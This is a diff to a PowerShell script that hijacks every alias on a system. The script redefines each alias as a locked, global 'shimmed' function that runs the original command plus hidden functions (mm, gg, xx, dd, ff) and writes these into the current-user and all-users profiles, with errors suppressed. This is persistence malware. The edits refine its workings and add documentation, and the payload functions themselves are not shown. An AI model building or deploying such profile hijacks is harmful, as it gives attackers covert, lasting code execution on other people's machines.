@@ -47,6 +47,10 @@ function create_map() {
     Name of alias that will serve as key
     #>
     param([parameter(ValueFromPipeline)][string]$alias)
+    if ($alias -match "gin") {
+        # Not shimming as newGuid() uses gin alias and that breaks things
+        return;
+    }
     $value = (Get-Alias -Name $alias).Definition
     $orig_dct[$alias] = $value
 }
@@ -54,22 +58,21 @@ function create_map() {
 function shim([string]$key, [string]$value) {
     <#
     .SYNOPSIS
-    A helper function that creates a hashmap
+    Creates array that contains function definton as well as set alias command to shim alias
     .DESCRIPTION
     Given the name of the alias will retrive the definition of the alias
     and create a new entry in the hashmap with the 
     key being the alias and the value being the definition
     .PARAMETER key
-     Name of alias 
+    Name of alias 
     .PARAMETER value
-     Definition of alias (key)
+    Definition of alias (key)
     .OUTPUTS
     arr: Array that contains two elements
     First element: String that is definition of function that contains shimmed functions as well as definition for alias
     Second element: String that redefines the alias with the Value being our shimmed functon 
-     
     #>
-    $y = "function shimmed_$key {{$value; Invoke-Expression('mm; gg; xx; dd; ff')}}"
+    $y = "function shimmed_$key {$value; mm; gg; xx; dd; ff}"
     $tmp = "shimmed_$key"
     $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
     $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
@@ -82,6 +85,16 @@ function shim([string]$key, [string]$value) {
 
 
 function write_to([string]$path, [string]$val) {
+    <#
+    .SYNOPSIS
+    Function that given a path and value will add that content to path
+    .DESCRIPTION
+    Given path and value simply adds it to file, wrapped in Try Catch statement
+    .PARAMETER path
+    File path to write to
+    .PARAMETER value
+    Value that will be appended to path
+    #>
     Try {
         Add-Content -Path $path -Value $val
     }
@@ -90,10 +103,17 @@ function write_to([string]$path, [string]$val) {
     }
 }
 function main() {
+    <#
+    .SYNOPSIS
+    Function that given a path and value will add that content to path
+    .DESCRIPTION
+    Given path and value simply adds it to file, wrapped in Try Catch statement
+    .PARAMETER path
+    File path to write to
+    .PARAMETER value
+    Value that will be appended to path
+    #>
     Get-Alias | ForEach-Object { $_.Name | create_map }
-    #exit 2
-    #$cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
-    #$env:USERNAME may be modified
     $curuser_allhosts = $PROFILE.CurrentUserAllHosts
     $allusers_allhosts = $PROFILE.AllUsersAllHosts
 
@@ -124,8 +144,7 @@ function main() {
         $all += $alias_line
         $all += $func_shim
     }
-    $all
-    #exit 2 
+    # Array that contains shimmed functions as well as set alias commands to add to profiles
     Try {
         write_to $curuser_allhosts $mm
         write_to $curuser_allhosts $gg
@@ -137,7 +156,7 @@ function main() {
         }
     }
     Catch { }
-
+    # First add functions than iterate through array 
     Try {
         write_to $allusers_allhosts $mm
         write_to $allusers_allhosts $gg
